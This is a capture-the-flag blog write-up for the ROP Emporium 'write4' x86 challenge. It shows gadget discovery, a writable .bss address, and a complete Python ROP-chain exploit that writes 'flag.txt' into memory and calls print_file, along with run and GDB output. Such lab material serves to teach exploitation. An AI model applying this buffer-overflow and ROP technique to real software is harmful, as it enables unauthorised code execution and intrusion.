---
title: "ROP Emporium - write4"
categories: [Binary, Exploitation]
tags: [x86, x86-64, ARMv5, ARM, MIPS]

---

When tackling Return Oriented Programming (ROP) challenges, we often look for helpful gadgets and familiar strings like `/bin/cat flag.txt` to simplify our exploitation. However, in the **"write4"** challenge, we face a scenario where the string isn’t present in the binary. This forces us to learn a crucial ROP technique — **writing arbitrary data into memory**.

In this blog, I’ll walk through how we can write data into the process’s memory space using ROP, and then use it to execute commands — precisely the skill "write4" wants us to learn.

After running our usual checks:

```bash
strings write432 | grep "cat"
strings write432 | grep "flag"
```

We find that, no `/bin/cat` or `flag` string is present.

However, we’re provided with useful ROP gadgets for writing data.


The goal here is simple:

1. Write `/bin/cat flag.txt` kinda string somewhere in memory using ROP.
2. Call `system` (or equivalent) with the address of the string we wrote.

The author has conveniently provided a `print_file` function, which takes a string argument, opens the corresponding file, and prints its contents. This means we simply need to write the string `flag.txt` into memory and pass its address to this function.

```c
int __cdecl print_file(char *filename)
{
  char s[33]; // [esp+Bh] [ebp-2Dh] BYREF
  FILE *stream; // [esp+2Ch] [ebp-Ch]

  stream = fopen(filename, "r");
  if ( !stream )
  {
    printf("Failed to open file: %s\n", filename);
    exit(1);
  }
  fgets(s, 33, stream);
  puts(s);
  return fclose(stream);
}
```

For offset calculation you can refer my previous blogs in this ROP Emporium series.

The offset is 44 for overwriting EIP.

On decompiling `write432` we can see there is a function by name`usefulGadgets`.
We can disassemble it in GDB -

```bash
pwndbg> disass usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x08048543 <+0>:	mov    DWORD PTR [edi],ebp
   0x08048545 <+2>:	ret    
   0x08048546 <+3>:	xchg   ax,ax
   0x08048548 <+5>:	xchg   ax,ax
   0x0804854a <+7>:	xchg   ax,ax
   0x0804854c <+9>:	xchg   ax,ax
   0x0804854e <+11>:	xchg   ax,ax
End of assembler dump.
```

Gadget - `mov    DWORD PTR [edi],ebp` can be helpful to. **ropper** also gives the same gadget.

```bash
ropper --file write432 --search 'mov'
# ...
0x08048543: mov dword ptr [edi], ebp; ret;
# ...
```

This gadget allows us to write the value stored in `ebp` to the memory address pointed to by `edi`. In other words, it’s a **"write-what-where"** primitive — exactly what we need to place our desired string (`flag.txt`) into a writable memory region.

Next, we need gadgets to control the values of `edi` and `ebp`. Fortunately, the binary provides suitable `pop` gadgets that let us load values into these registers:

```bash
ropper --file write432 --search 'pop'
# ...
0x080485aa: pop edi; pop ebp; ret; 
# ...
```

This gadget lets us load any address into `edi` (where we want to write) and any value into `ebp` (what we want to write).

#### Writing `flag.txt` into Memory

Now that we have all the pieces, here’s the overall plan:

1. Find a writable memory section (usually `.bss`).
2. Use the `pop edi; pop ebp; ret;` gadget to load our target address and desired string into the registers.
3. Use `mov dword ptr [edi], ebp; ret;` to write the data to memory.
4. Repeat as needed to write the full string.
5. Call `print_file` with the address where we wrote `flag.txt`.

#### Finding Writable Memory

We can easily identify a writable section by inspecting the binary:

```bash
readelf -S write432
```

Look for the `.bss` section or another writable region:

```txt
 [25] .bss           NOBITS          0804a020 001020 000004 00  WA  0   0  1
 ```

Here, we’ll use address `0x0804a020` for writing.

#### Payload Construction

The string `flag.txt` is 8 bytes long, so we can split it into two parts since we’re writing 4 bytes at a time (because the gadget moves `dword`, i.e., 4 bytes):

- First write: `'flag'`
- Second write: `'.txt'`


Now that we have identified the required gadgets, we can start crafting our payload.

Here’s the plan:

1. Write `"flag"` to `.bss` (`0x0804a020`).
2. Write `".txt"` to `.bss + 4` (`0x0804a024`).
3. Call the `print_file` function with the address `0x0804a020` as the argument.

```python
#!/usr/bin/python3
import sys
import struct

payload = b'A' * 40               # Padding to overflow buffer (40 bytes)
payload += b'B' * 4               # Overwrite saved EBP (can be junk here)

# First write: write 'flag' to 0x0804a020
payload += struct.pack("<I", 0x080485aa)        # pop edi; pop ebp; ret;
payload += struct.pack("<I", 0x0804a020)        # edi = destination address (.bss)
payload += b'flag'                # ebp = data to write (4 bytes)
payload += struct.pack("<I", 0x08048543)        # mov dword ptr [edi], ebp; ret;

# Second write: write '.txt' to 0x0804a024 (next 4 bytes)
payload += struct.pack("<I", 0x080485aa)        # pop edi; pop ebp; ret;
payload += struct.pack("<I", 0x0804a024)        # edi = destination address (.bss + 4)
payload += b'.txt'                # ebp = data to write (4 bytes)
payload += struct.pack("<I", 0x08048543)        # mov dword ptr [edi], ebp; ret;

# Call print_file with address of 'flag.txt'
payload += struct.pack("<I", 0x80483d0)         # Address of print_file
payload += struct.pack("<I", 0xdeadbeef)        # Return address after print_file (junk)
payload += struct.pack("<I", 0x0804a020)        # Argument: pointer to 'flag.txt' string we wrote

sys.stdout.buffer.write(payload)
```

Now that our payload is ready, let's test it:

```bash
python exp.py > exp.txt
cat exp.txt |  ./write432 
write4 by ROP Emporium
x86

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```

Awesome! We successfully triggered the `print_file` function, and it printed the flag. However, we also see a segmentation fault after that.

To understand why the program crashed, we can run it inside GDB:

```bash
gdb ./write432
pwndbg> r < exp.txt

#...
 EBP  0x7478742e ('.txt')
 ESP  0xffffd524 —▸ 0x804a020 (completed) ◂— 'flag.txt'
 EIP  0xdeadbeef
─────────────────────────────────[ DISASM / i386 / set emulate on ]─────────────────────────────────
Invalid address 0xdeadbeef

```

- Our ROP chain worked perfectly:  
    `print_file` was called with the correct argument (the memory address where we stored `"flag.txt"`).
- The flag was printed successfully.
- However, after `print_file` finished, it attempted to return to the address we supplied as the "return address" in our payload.
- In our exploit, we deliberately placed `0xdeadbeef` as the return address after `print_file` — a common placeholder in exploit development. Since this address isn’t mapped in memory, it caused a segmentation fault.

